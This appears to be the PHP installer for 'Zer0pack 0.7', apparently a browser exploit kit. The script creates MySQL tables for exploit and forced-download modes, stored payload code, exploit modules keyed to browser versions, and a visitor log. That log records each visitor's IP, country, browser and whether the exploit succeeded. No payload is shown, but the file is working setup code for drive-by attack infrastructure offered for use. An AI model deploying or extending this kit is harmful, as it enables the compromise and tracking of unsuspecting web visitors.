<div align=center>
<h1>Installer for Zer0pack 0.7 open alpha</h1>
<h2><b><font color=red>Don't run this script before having edit <i>config.php</i></font></b></h2>
<h3>Status:</h3>
<?php
error_reporting(0);
require('include/config.php');

$mysql_test=mysql_connect($mysql_server, $mysql_user, $mysql_password);
if(!$mysql_test) {
	die("<font color=red size=4><b>Couldn't connect to Mysql-server:</font> <i>$mysql_server</i><br>Username: <i>$mysql_user</i><br></b><br>".mysql_error());
} elseif(!mysql_select_db($mysql_db)) {
	die("<font color=red size=4><b>Couldn't select db:</font><i>$mysql_db</i><br></b><br>".mysql_error());
}
	echo 	"<font color=green size=4><b>Successfully connected!<br>DB <i>$mysql_db</i> selected!</b></font><br><br>
		 <form method=POST><input type=submit name=create_tables value=Install></form>";
	mysql_close($mysql_test);
if($_POST['create_tables']=="Install") {
	include('include/mysql_connect.php');
mysql_query('CREATE TABLE IF NOT EXISTS `'._PREFIX_.'settings` (`name` varchar(20) NOT NULL, `status` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=latin1');
mysql_query('INSERT INTO `'._PREFIX_.'settings` (`name`, `status`) VALUES	(\'mode_exploit\', \'false\'), (\'mode_forcedl\', \'false\'), (\'mode_ffaddon\', \'false\'), (\'mode_debug\', \'true\'), (\'mode_log\', \'true\'), (\'forcedl_file\', \'false\'), (\'ffaddon_file\', \'\'), (\'mode_ignore_version\', \'false\') ');
mysql_query('CREATE TABLE IF NOT EXISTS `'._PREFIX_.'payloads` (`name` varchar(100) NOT NULL, `description` varchar(200) NOT NULL, `type` varchar(20) NOT NULL, `platform` varchar(50) NOT NULL, `code` varchar(4096) NOT NULL, `active` varchar(10) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=latin1');
mysql_query('CREATE TABLE IF NOT EXISTS `'._PREFIX_.'visitors` (`referer` varchar(500) NOT NULL, `platform` varchar(100) NOT NULL, `browser` varchar(100) NOT NULL, `ip` varchar(18) NOT NULL, `flag` varchar(100) NOT NULL, `country` varchar(100) NOT NULL, `success` varchar(100) NOT NULL, `date` varchar(25) NOT NULL, `time` varchar(20) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=latin1');
mysql_query('CREATE TABLE IF NOT EXISTS `'._PREFIX_.'xmodules` (`name` varchar(100) NOT NULL, `payload` varchar(50) NOT NULL, `browser` varchar(50) NOT NULL, `version` varchar(50) NOT NULL, `filename` varchar(50) NOT NULL, `active` varchar(10) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=latin1');
	echo "Tables created!";
}
?>
</div>
